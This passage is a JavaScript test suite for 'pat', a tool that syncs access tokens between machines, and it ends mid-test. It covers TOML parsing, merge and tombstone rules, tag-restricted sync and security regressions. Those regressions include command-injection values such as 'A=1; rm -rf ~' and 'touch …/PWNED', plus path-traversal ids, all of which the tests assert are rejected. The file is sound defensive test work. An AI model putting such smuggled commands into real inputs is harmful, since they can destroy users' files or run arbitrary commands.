// pat — the parser, the merge rules and a two-machine sync round trip.
//
// The sync test replaces the ssh runner with a local shell and a fake remote
// $HOME, so the real remote script and the real tar transport are exercised
// without a network or a second machine.

import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { spawnSync } from 'node:child_process';

import { parseToml } from '../tools/pat/toml.mjs';
import {
  ENV_FILE,
  appendTokenStanza,
  ensureHome,
  loadConfig,
  loadInventory,
  renderConfig,
  writeFileAtomic,
} from '../tools/pat/config.mjs';
import * as store from '../tools/pat/store.mjs';
import * as commands from '../tools/pat/commands.mjs';
import * as setup from '../tools/pat/setup.mjs';
import { setSshRunner } from '../tools/pat/transport.mjs';

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'pat-test-'));
after(() => fs.rmSync(root, { recursive: true, force: true }));

// No test may touch the network. Until a case installs its own runner, every
// peer is unreachable — which also exercises the offline paths (`pat set` must
// work with all peers down).
const offlineRunner = () => ({ status: 255, stdout: Buffer.alloc(0), stderr: Buffer.from('offline in tests') });
setSshRunner(offlineRunner);
after(() => setSshRunner(offlineRunner));

let counter = 0;
function scratch() {
  counter += 1;
  const dir = path.join(root, `case-${counter}`);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

function writeInventory(home, rows) {
  ensureHome(home);
  writeFileAtomic(path.join(home, 'inventory.toml'), '# inventory\n');
  for (const row of rows) appendTokenStanza(home, row);
}

function token(overrides = {}) {
  return {
    id: 'github',
    var: 'GITHUB_TOKEN',
    system: 'GitHub',
    owner: 'nathan',
    renewUrl: 'https://example.invalid/tokens',
    how: 'fine-grained',
    ttlDays: 60,
    issued: '2026-10-14',
    onlyOn: [],
    consumers: ['orca worktree env'],
    check: { kind: 'none' },
    ...overrides,
  };
}

// --- TOML -------------------------------------------------------------------

test('toml: tables, array-of-tables, nested table, inline table and dates', () => {
  const doc = parseToml(
    `# leading comment
preferred_source = "dreamevil"

[[token]]
id = "github"
var = "GITHUB_TOKEN"   # trailing comment
ttl_days = 60
issued = 2026-10-14
only_on = ["work", "homelab"]
enabled = true

[token.check]
kind = "http"
url = "https://api.example.invalid/user"

[[token]]
id = 'linear'
check = { kind = "http", method = "GET", url = "https://linear.invalid/graphql" }
urls = [
  "a",
  "b",
]
`,
    'inventory.toml',
  );

  assert.equal(doc.preferred_source, 'dreamevil');
  assert.equal(doc.token.length, 2);
  assert.equal(doc.token[0].id, 'github');
  assert.equal(doc.token[0].ttl_days, 60);
  assert.equal(doc.token[0].issued, '2026-10-14');
  assert.deepEqual(doc.token[0].only_on, ['work', 'homelab']);
  assert.equal(doc.token[0].enabled, true);
  assert.equal(doc.token[0].check.kind, 'http');
  assert.equal(doc.token[1].id, 'linear');
  assert.equal(doc.token[1].check.url, 'https://linear.invalid/graphql');
  assert.deepEqual(doc.token[1].urls, ['a', 'b']);
});

test('toml: quoted keys with dots and escaped strings', () => {
  const doc = parseToml(`[hosts."work.box"]\npath = "a\\tb"\nnote = 'literal \\n stays'\n`);
  assert.equal(doc.hosts['work.box'].path, 'a\tb');
  assert.equal(doc.hosts['work.box'].note, 'literal \\n stays');
});

test('toml: an unsupported value fails loudly instead of guessing', () => {
  assert.throws(() => parseToml('x = notavalue\n', 'config.toml'), /config\.toml:1: unsupported value/);
  assert.throws(() => parseToml('x = "unterminated\n', 'config.toml'), /unterminated string/);
});

test('toml: a definition that would silently change meaning is an error', () => {
  // Each of these used to parse into a plausible-but-wrong document, which for
  // an inventory means handing back the wrong token under a familiar name.
  assert.throws(() => parseToml('id = "work"\nid = "home"\n', 'i.toml'), /i\.toml:2: key id is defined more than once/);
  assert.throws(() => parseToml('[self]\nname = "a"\n[self]\nname = "b"\n', 'i.toml'), /is declared more than once/);
  assert.throws(() => parseToml('[[token]]\nid = "a"\n[token]\nid = "b"\n', 'i.toml'), /already an array of tables/);
  assert.throws(() => parseToml('[token]\nid = "a"\n[[token]]\nid = "b"\n', 'i.toml'), /conflicts with an existing table/);
  assert.throws(() => parseToml('x = ["a",,"b"]\n', 'i.toml'), /array contains an empty element/);
  assert.throws(() => parseToml('issued = 2026-10-14 oops\n', 'i.toml'), /unsupported value/);
  assert.throws(() => parseToml('[a..b]\n', 'i.toml'), /empty key segment/);
  assert.throws(() => parseToml('c = { kind = "http", kind = "command" }\n', 'i.toml'), /defined more than once/);
  assert.throws(() => parseToml('a = { b = 1 }\n[a]\nc = 2\n', 'i.toml'), /already defined as an inline table/);

  // The legitimate forms must still work.
  assert.deepEqual(parseToml('x = ["a", "b",]\n').x, ['a', 'b']);
  assert.deepEqual(parseToml('x = []\n').x, []);
  assert.equal(parseToml('issued = 2026-10-14T09:30:00Z\n').issued, '2026-10-14T09:30:00Z');
  assert.deepEqual(parseToml('a.b = 1\na.c = 2\n').a, { b: 1, c: 2 });
});

// --- config + inventory -----------------------------------------------------

test('config: host defaults, self name and local tags', () => {
  const home = scratch();
  writeFileAtomic(
    path.join(home, 'config.toml'),
    renderConfig({
      self: { name: 'office_m1', tags: ['work'] },
      preferredSource: 'dreamevil',
      hosts: {
        dreamevil: { name: 'dreamevil', ssh: 'dreamevil', tags: ['work', 'homelab'], path: '~/.config/pat', mode: 'both', enabled: true },
        nas: { name: 'nas', ssh: 'root@nas', tags: [], path: '/srv/pat', mode: 'pull', enabled: false },
      },
    }),
  );
  const config = loadConfig(home);
  assert.equal(config.self.name, 'office_m1');
  assert.deepEqual(config.hosts.dreamevil.tags, ['work', 'homelab']);
  assert.equal(config.hosts.nas.ssh, 'root@nas');
  assert.equal(config.hosts.nas.mode, 'pull');
  assert.equal(config.hosts.nas.enabled, false);
  assert.equal(config.preferredSource, 'dreamevil');
  assert.deepEqual(commands.context(home).tags, ['work']);
});

test('inventory: missing var is derived from the id', () => {
  const home = scratch();
  writeInventory(home, [{ ...token({ id: 'linear', var: undefined }), check: { kind: 'none' } }]);
  const inventory = loadInventory(home);
  assert.equal(inventory.tokens.length, 1);
  assert.equal(inventory.tokens[0].var, 'LINEAR_TOKEN');
});

test('tag targeting: a token restricted to another tag is not rendered', () => {
  const home = scratch();
  writeFileAtomic(
    path.join(home, 'config.toml'),
    renderConfig({ self: { name: 'homebox', tags: ['homelab'] }, hosts: {} }),
  );
  writeInventory(home, [token({ onlyOn: ['work'] }), token({ id: 'hass', var: 'HASS_TOKEN', onlyOn: ['homelab'] })]);

  const ctx = commands.context(home);
  store.writeSecret(home, 'github', 'ghp_work');
  store.writeMeta(home, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 1, value: 'ghp_work', updatedBy: 'homebox' }));
  store.writeSecret(home, 'hass', 'hass_value');
  store.writeMeta(home, store.makeMeta({ id: 'hass', varName: 'HASS_TOKEN', version: 1, value: 'hass_value', updatedBy: 'homebox' }));

  const rendered = commands.renderLocal(ctx);
  assert.deepEqual(rendered.included, ['hass']);
  assert.ok(rendered.text.includes("export HASS_TOKEN='hass_value'"));
  assert.ok(!rendered.text.includes('ghp_work'));
});

test('shell quoting survives a quote in the value', () => {
  assert.equal(store.shellQuote("a'b"), `'a'\\''b'`);
});

// --- merge rules ------------------------------------------------------------

function meta(id, version, value, extra = {}) {
  return { ...store.makeMeta({ id, varName: 'X', version, value, updatedBy: 'host' }), ...extra };
}

test('merge: higher version wins and is adopted', () => {
  const local = new Map([['github', meta('github', 3, 'old')]]);
  const remote = new Map([['github', meta('github', 4, 'new')]]);
  const merged = store.mergeStates(local, remote);
  assert.deepEqual(merged.adopt.map((entry) => entry.id), ['github']);
  assert.equal(merged.next.get('github').version, 4);
  assert.equal(merged.conflicts.length, 0);
});

test('merge: a lower remote version is ignored, not applied', () => {
  const local = new Map([['github', meta('github', 5, 'mine')]]);
  const remote = new Map([['github', meta('github', 4, 'theirs')]]);
  const merged = store.mergeStates(local, remote);
  assert.equal(merged.adopt.length, 0);
  assert.deepEqual(merged.ignore.map((entry) => entry.id), ['github']);
  assert.equal(merged.next.get('github').version, 5);
});

test('merge: equal version with a different value is a conflict, not a clobber', () => {
  const local = new Map([['github', meta('github', 7, 'mine')]]);
  const remote = new Map([['github', meta('github', 7, 'theirs')]]);
  const merged = store.mergeStates(local, remote);
  assert.equal(merged.conflicts.length, 1);
  assert.deepEqual(merged.adopt, []);
  assert.equal(merged.next.get('github').sha, store.sha256('mine'));
});

test('merge: equal version and equal value converges silently', () => {
  const merged = store.mergeStates(new Map([['a', meta('a', 2, 'v')]]), new Map([['a', meta('a', 2, 'v')]]));
  assert.equal(merged.adopt.length, 0);
  assert.equal(merged.conflicts.length, 0);
  assert.deepEqual(merged.converged.map((entry) => entry.id), ['a']);
});

test('merge: a tombstone propagates and cannot be resurrected by a stale peer', () => {
  const removed = { ...meta('github', 9, 'x'), removed: true, sha: '' };
  const live = new Map([['github', meta('github', 8, 'x')]]);

  const deleted = store.mergeStates(live, new Map([['github', removed]]));
  assert.ok(deleted.next.get('github').removed);
  assert.equal(deleted.next.get('github').version, 9);

  const stalePeer = store.mergeStates(new Map([['github', removed]]), live);
  assert.equal(stalePeer.adopt.length, 0);
  assert.ok(stalePeer.next.get('github').removed);
});

// --- two-machine sync -------------------------------------------------------

function fakePeer(remotes) {
  const calls = [];
  const runner = (alias, command, options = {}) => {
    const home = remotes[alias];
    if (!home) return { status: 255, stdout: Buffer.alloc(0), stderr: Buffer.from(`unknown host ${alias}`) };
    calls.push(command);
    const script = command.split('$HOME').join(home);
    return spawnSync('sh', ['-c', script], { input: options.input, timeout: options.timeoutMs, encoding: null });
  };
  return { runner, calls };
}

test('sync: a work token reaches a work peer and never a home peer', async () => {
  const localHome = scratch();
  const workHome = path.join(scratch(), 'remote');
  const homeBoxHome = path.join(scratch(), 'remote');

  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: ['work', 'homelab'] },
      hosts: {
        workpeer: { name: 'workpeer', ssh: 'workpeer', tags: ['work'], path: workHome, mode: 'both', enabled: true },
        homebox: { name: 'homebox', ssh: 'homebox', tags: ['homelab'], path: homeBoxHome, mode: 'both', enabled: true },
      },
    }),
  );
  writeInventory(localHome, [
    token({ id: 'github', onlyOn: ['work'] }),
    token({ id: 'hass', var: 'HASS_TOKEN', onlyOn: ['homelab'] }),
  ]);

  const ctx = commands.context(localHome);
  assert.equal((await commands.setToken({ ctx, id: 'github', value: 'ghp_work_value', verify: false })).ok, true);
  assert.equal((await commands.setToken({ ctx, id: 'hass', value: 'hass_value', verify: false })).ok, true);

  const { runner } = fakePeer({ workpeer: workHome, homebox: homeBoxHome });
  setSshRunner(runner);
  after(() => setSshRunner(offlineRunner));

  const workResult = await commands.pushHost({ ctx, host: ctx.config.hosts.workpeer, verify: true });
  assert.equal(workResult.ok, true, workResult.error);
  assert.equal(workResult.verify.ok, true, workResult.verify?.detail);

  assert.equal(fs.readFileSync(path.join(workHome, 'state', 'github.secret'), 'utf8'), 'ghp_work_value');
  assert.equal(fs.existsSync(path.join(workHome, 'state', 'hass.secret')), false, 'homelab token must not reach a work peer');
  const workEnv = fs.readFileSync(path.join(workHome, ENV_FILE), 'utf8');
  assert.ok(workEnv.includes("export GITHUB_TOKEN='ghp_work_value'"));
  assert.ok(!workEnv.includes('hass_value'));
  assert.equal(fs.existsSync(path.join(workHome, '.allowed')), false, 'the prune list is transient');
  assert.equal(fs.statSync(path.join(workHome, ENV_FILE)).mode & 0o777, 0o600);

  const homeResult = await commands.pushHost({ ctx, host: ctx.config.hosts.homebox, verify: true });
  assert.equal(homeResult.ok, true, homeResult.error);
  assert.equal(fs.existsSync(path.join(homeBoxHome, 'state', 'github.secret')), false, 'work token must not reach a home peer');
  assert.ok(fs.readFileSync(path.join(homeBoxHome, ENV_FILE), 'utf8').includes("export HASS_TOKEN='hass_value'"));
});

test('sync: a peer rotation is adopted locally, and a conflicting one is surfaced', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: ['work'] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: ['work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github' })]);

  const ctx = commands.context(localHome);
  await commands.setToken({ ctx, id: 'github', value: 'v1', verify: false });
  const { runner } = fakePeer({ peer: peerHome });
  setSshRunner(runner);
  after(() => setSshRunner(offlineRunner));

  assert.equal((await commands.pushHost({ ctx, host: ctx.config.hosts.peer })).ok, true);

  // The peer rotates on its own: same token, higher version, new value.
  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'v2-from-peer');
  store.writeMeta(peerHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 9, value: 'v2-from-peer', updatedBy: 'peer' }));

  const pulled = await commands.pullHost({ ctx, host: ctx.config.hosts.peer });
  assert.deepEqual(pulled.adopted, ['github']);
  assert.equal(store.readSecret(localHome, 'github'), 'v2-from-peer');

  // A same-version, different-value state is a conflict: reported, never applied.
  store.writeSecret(peerHome, 'github', 'someone-elses');
  store.writeMeta(peerHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 9, value: 'someone-elses', updatedBy: 'peer' }));
  const conflicted = await commands.pullHost({ ctx, host: ctx.config.hosts.peer });
  assert.equal(conflicted.conflicts.length, 1);
  assert.equal(store.readSecret(localHome, 'github'), 'v2-from-peer');

  // `take` resolves it by adopting the peer's value at a strictly higher version.
  const taken = await commands.takeFrom({ ctx, host: ctx.config.hosts.peer, id: 'github' });
  assert.equal(taken.ok, true, taken.error);
  assert.equal(store.readSecret(localHome, 'github'), 'someone-elses');
  assert.equal(store.readMetas(localHome).get('github').version, 10);
});

test('sync: deleting a token retires it on every peer', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: [] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: [], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github' })]);

  const ctx = commands.context(localHome);
  await commands.setToken({ ctx, id: 'github', value: 'v1', verify: false });
  const { runner } = fakePeer({ peer: peerHome });
  setSshRunner(runner);
  after(() => setSshRunner(offlineRunner));

  assert.equal((await commands.pushHost({ ctx, host: ctx.config.hosts.peer })).ok, true);
  assert.equal(fs.existsSync(path.join(peerHome, 'state', 'github.secret')), true);

  const current = store.readMetas(localHome).get('github');
  store.writeMeta(localHome, { ...current, version: current.version + 1, removed: true, sha: '' });
  store.deleteSecret(localHome, 'github');

  assert.equal((await commands.pushHost({ ctx, host: ctx.config.hosts.peer })).ok, true);
  assert.equal(fs.existsSync(path.join(peerHome, 'state', 'github.secret')), false, 'the tombstone must delete the peer value');
  assert.ok(!fs.readFileSync(path.join(peerHome, ENV_FILE), 'utf8').includes('v1'));
});

// --- setup ------------------------------------------------------------------

test('setup: host add writes a section and probe failure refuses to record', () => {
  const home = scratch();
  setup.runSetup({ home, selfName: 'localbox', tags: ['work'], wire: false });

  const failing = setup.addHost({
    home,
    config: loadConfig(home),
    host: setup.hostEntry({ name: 'broken', tags: ['work'] }),
    probe: () => ({ ok: false, steps: [{ name: 'reachable', ok: false, detail: 'unreachable' }], root: '$HOME' }),
  });
  assert.equal(failing.ok, false);
  assert.equal(loadConfig(home).hosts.broken, undefined);

  const added = setup.addHost({
    home,
    config: loadConfig(home),
    host: setup.hostEntry({ name: 'peer', ssh: 'peer.example', tags: ['work', 'homelab'] }),
    probe: () => ({ ok: true, steps: [], root: '$HOME' }),
  });
  assert.equal(added.ok, true);
  const config = loadConfig(home);
  assert.equal(config.hosts.peer.ssh, 'peer.example');
  assert.deepEqual(config.hosts.peer.tags, ['work', 'homelab']);
  assert.equal(config.self.name, 'localbox', 'adding a host keeps [self] intact');
});

test('setup: import-env only proposes PAT-shaped variables', () => {
  const home = scratch();
  writeInventory(home, [token({ id: 'github' })]);
  const inventory = loadInventory(home);
  const candidates = setup.findEnvCandidates({
    inventory,
    env: { GITHUB_TOKEN: 'already-known-value', LINEAR_API_KEY: 'lin_abcdefgh', PATH: '/usr/bin', ANTHROPIC_API_KEY: 'sk-ant-xyz' },
  });
  assert.deepEqual(
    candidates.map((entry) => entry.id).sort(),
    ['anthropic', 'linear'],
  );
});

test('doctor: flags an orphan state file and a missing value', () => {
  const home = scratch();
  setup.runSetup({ home, selfName: 'localbox', tags: [], wire: false });
  writeInventory(home, [token({ id: 'github' }), token({ id: 'linear', var: 'LINEAR_API_KEY' })]);
  store.writeSecret(home, 'github', 'v');
  store.writeMeta(home, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 1, value: 'v', updatedBy: 'localbox' }));
  store.writeSecret(home, 'old', 'v');
  store.writeMeta(home, store.makeMeta({ id: 'old', varName: 'OLD_TOKEN', version: 1, value: 'v', updatedBy: 'localbox' }));

  const result = commands.doctor(commands.context(home));
  const coverage = result.findings.find((finding) => finding.name === 'inventory coverage');
  assert.equal(coverage.status, 'warn');
  assert.match(coverage.detail, /no inventory row: old/);
  const values = result.findings.find((finding) => finding.name === 'values stored');
  assert.match(values.detail, /no value yet: linear/);
});

// --- regressions from the pre-commit review --------------------------------
//
// Each of these reproduces something a peer could do to this machine, or this
// machine could do to a peer. They failed before the review fixes.

test('peer metadata: a hostile var never reaches secrets.env', async () => {
  const localHome = scratch();
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({ self: { name: 'localbox', tags: [] }, hosts: {} }),
  );
  writeInventory(localHome, [token({ id: 'github' })]);

  // The peer controls both the meta's var and the value; only the inventory's
  // variable name may be used, because secrets.env is sourced by every shell.
  const payload = `X=1; touch ${path.join(localHome, 'PWNED')}; Y`;
  store.writeSecret(localHome, 'github', 'peer_value');
  fs.writeFileSync(
    store.metaPath(localHome, 'github'),
    `${JSON.stringify({ id: 'github', var: payload, version: 4, sha: store.sha256('peer_value'), updated_at: '', updated_by: 'peer', removed: false })}\n`,
    { mode: 0o600 },
  );

  const metas = store.readMetas(localHome);
  assert.equal(metas.get('github').var, '', 'a non-identifier var is dropped on read');

  const ctx = commands.context(localHome);
  const rendered = store.renderEnv({ home: localHome, config: ctx.config, inventory: ctx.inventory, metas, tags: [], hostName: 'localbox' });
  assert.match(rendered.text, /export GITHUB_TOKEN='peer_value'/);
  assert.ok(!rendered.text.includes('touch'), 'the peer-supplied var must not be rendered');
  assert.equal(fs.existsSync(path.join(localHome, 'PWNED')), false);
});

test('peer metadata: an id that tries to escape state/ is never trusted', () => {
  const home = scratch();
  ensureHome(home);
  fs.writeFileSync(path.join(home, 'state', 'evil.meta.json'), `${JSON.stringify({ id: '../../ESCAPED', version: 1, sha: '' })}\n`);

  const metas = store.readMetas(home);
  assert.equal(metas.has('../../ESCAPED'), false);
  assert.equal(metas.get('evil').corrupt, true, 'it is reported, not adopted');
  assert.equal(fs.existsSync(path.join(home, 'ESCAPED.meta.json')), false);

  // Writing through a traversal id is refused at the API too.
  assert.throws(() => store.writeSecret(home, '../../ESCAPED', 'x'), /invalid id/);
  assert.throws(() => store.writeMeta(home, { id: '../../ESCAPED', version: 1 }), /invalid id/);
  store.deleteSecret(home, '../../ESCAPED');
});

test('pull: a token this machine is not tagged for is neither adopted nor kept', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'homebox', tags: ['homelab'] },
      hosts: { workpeer: { name: 'workpeer', ssh: 'workpeer', tags: ['work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github', onlyOn: ['work'] })]);

  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'ghp_work_value');
  store.writeMeta(peerHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 3, value: 'ghp_work_value', updatedBy: 'workpeer' }));

  // A stray copy that an earlier pull or a tag change left behind.
  store.writeSecret(localHome, 'github', 'stale_work_value');
  store.writeMeta(localHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 2, value: 'stale_work_value', updatedBy: 'homebox' }));

  setSshRunner(fakePeer({ workpeer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const ctx = commands.context(localHome);
  const result = await commands.pullHost({ ctx, host: ctx.config.hosts.workpeer });
  assert.equal(result.ok, true, result.error);
  assert.deepEqual(result.adopted, []);
  assert.ok(result.rejected.some((entry) => entry.id === 'github' && /not tagged/.test(entry.reason)), JSON.stringify(result.rejected));
  assert.equal(store.readSecret(localHome, 'github'), null, 'the stray work token is pruned');
  assert.equal(store.readMetas(localHome).has('github'), false);
});

test('push: a peer that is behind still never receives a token its tags exclude', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'workbox', tags: ['work'] },
      hosts: { homebox: { name: 'homebox', ssh: 'homebox', tags: ['homelab'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github', onlyOn: ['work'] })]);

  const ctx = commands.context(localHome);
  await commands.setToken({ ctx, id: 'github', value: 'NEWWORK', verify: false });

  // The home peer is behind, which used to be treated as "leave it alone" and
  // skipped the tag check entirely.
  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'OLDWORK');
  store.writeMeta(peerHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 1, value: 'OLDWORK', updatedBy: 'homebox' }));

  setSshRunner(fakePeer({ homebox: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  // A second rotation puts us genuinely ahead of the peer (v2 > v1), which is
  // the case this test is about; equal versions would be a conflict, and a
  // conflict is left alone rather than pruned.
  const rotated = await commands.setToken({ ctx, id: 'github', value: 'NEWWORK', verify: false });
  assert.equal(rotated.ok, true, rotated.error);

  const result = await commands.pushHost({ ctx, host: ctx.config.hosts.homebox });
  assert.equal(result.ok, true, result.error);
  assert.ok(result.omitted.includes('github'));
  assert.equal(store.readSecret(peerHome, 'github'), null, 'the excluded token is pruned from the peer');
});

test('push: a conflicting id keeps the peer value instead of overwriting it', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: [] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: [], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github' })]);

  const ctx = commands.context(localHome);
  store.writeSecret(localHome, 'github', 'MINE');
  store.writeMeta(localHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 5, value: 'MINE', updatedBy: 'localbox' }));

  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'THEIRS');
  store.writeMeta(peerHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 5, value: 'THEIRS', updatedBy: 'peer' }));

  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const result = await commands.pushHost({ ctx, host: ctx.config.hosts.peer });
  assert.equal(result.ok, true, result.error);
  assert.equal(result.conflicts.length, 1);
  assert.ok(!result.pushed.includes('github'), 'a conflicting id is not shipped');
  assert.equal(store.readSecret(peerHome, 'github'), 'THEIRS', "the peer's rotation survives");
});

test('set: a rotation beats a higher version on a peer instead of being adopted away', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: [] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: [], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github' })]);

  const ctx = commands.context(localHome);
  await commands.setToken({ ctx, id: 'github', value: 'v1', verify: false });

  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'peer_v9');
  store.writeMeta(peerHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 9, value: 'peer_v9', updatedBy: 'peer' }));

  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const rotated = await commands.setToken({ ctx, id: 'github', value: 'FRESH', verify: false });
  assert.equal(rotated.version, 10, 'the new value must outrank the peer, not lose to it');

  const pulled = await commands.pullHost({ ctx, host: ctx.config.hosts.peer });
  assert.deepEqual(pulled.adopted, [], 'the fresh rotation is not replaced by the older peer value');
  assert.equal(store.readSecret(localHome, 'github'), 'FRESH');
  assert.equal(store.readArchive(localHome, 'github'), 'v1', 'the displaced value is recoverable');
});

test('pull: a value that does not match its metadata hash is not adopted', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: [] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: [], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github' })]);

  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'TRUNC');
  store.writeMeta(peerHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 7, value: 'GOOD', updatedBy: 'peer' }));

  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const ctx = commands.context(localHome);
  const result = await commands.pullHost({ ctx, host: ctx.config.hosts.peer });
  assert.deepEqual(result.adopted, []);
  assert.ok(result.rejected.some((entry) => /hash/.test(entry.reason)), JSON.stringify(result.rejected));
  assert.equal(store.readSecret(localHome, 'github'), null);
});

test('store: a symlinked secret is not followed', () => {
  const home = scratch();
  ensureHome(home);
  const outside = path.join(home, 'outside.txt');
  fs.writeFileSync(outside, 'not-a-token', { mode: 0o600 });
  fs.symlinkSync(outside, store.secretPath(home, 'github'));

  assert.equal(store.readSecret(home, 'github'), null, 'a pointer is not a value');
});

test('push: a corrupt peer meta is never pruned', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: [] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: [], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github' })]);

  const ctx = commands.context(localHome);
  await commands.setToken({ ctx, id: 'github', value: 'v1', verify: false });

  // We cannot parse this meta, which is not evidence the peer must not hold it.
  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  fs.writeFileSync(path.join(peerHome, 'state', 'linear.meta.json'), '{ this is not json');
  store.writeSecret(peerHome, 'linear', 'peer_only_value');

  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const result = await commands.pushHost({ ctx, host: ctx.config.hosts.peer });
  assert.equal(result.ok, true, result.error);
  assert.equal(store.readSecret(peerHome, 'linear'), 'peer_only_value', "the peer's only copy survives a parse failure");
});

test('sync: a pull-mode peer is never written to', () => {
  assert.equal(commands.shouldPushTo({ mode: 'pull' }, 'sync'), false);
  assert.equal(commands.shouldPushTo({ mode: 'pull' }, 'push'), false);
  assert.equal(commands.shouldPushTo({ mode: 'both' }, 'sync'), true);
  assert.equal(commands.shouldPushTo({ mode: 'both' }, 'pull'), false);
  assert.equal(commands.shouldPushTo({ mode: 'push' }, 'sync'), true);
});

test('inventory: a duplicate id fails loudly instead of silently winning', () => {
  const home = scratch();
  ensureHome(home);
  writeFileAtomic(
    path.join(home, 'inventory.toml'),
    '[[token]]\nid = "work"\nvar = "WORK_TOKEN"\n\n[[token]]\nid = "work"\nvar = "HOME_TOKEN"\n',
  );
  assert.throws(() => loadInventory(home), /defined more than once/);

  writeFileAtomic(path.join(home, 'inventory.toml'), '[[token]]\nid = "../escape"\n');
  assert.throws(() => loadInventory(home), /invalid token id/);

  writeFileAtomic(path.join(home, 'inventory.toml'), '[[token]]\nid = "x"\nvar = "A=1; rm -rf ~"\n');
  assert.throws(() => loadInventory(home), /invalid var/);

  writeFileAtomic(path.join(home, 'inventory.toml'), '[[token]]\nid = "x"\ncheck = { kind = "http", url = "http://example.invalid/x" }\n');
  assert.throws(() => loadInventory(home), /must be https/);
});

test('rm: retiring a token writes a tombstone that the peer honours', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: [] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: [], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github' })]);

  const ctx = commands.context(localHome);
  await commands.setToken({ ctx, id: 'github', value: 'v1', verify: false });
  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));
  assert.equal((await commands.pushHost({ ctx, host: ctx.config.hosts.peer })).ok, true);
  assert.equal(store.readSecret(peerHome, 'github'), 'v1');

  const removed = commands.removeToken({ ctx, id: 'github' });
  assert.equal(removed.ok, true, removed.error);
  assert.equal(store.readMetas(localHome).get('github').removed, true);
  assert.equal(store.readSecret(localHome, 'github'), null);

  assert.equal((await commands.pushHost({ ctx, host: ctx.config.hosts.peer })).ok, true);
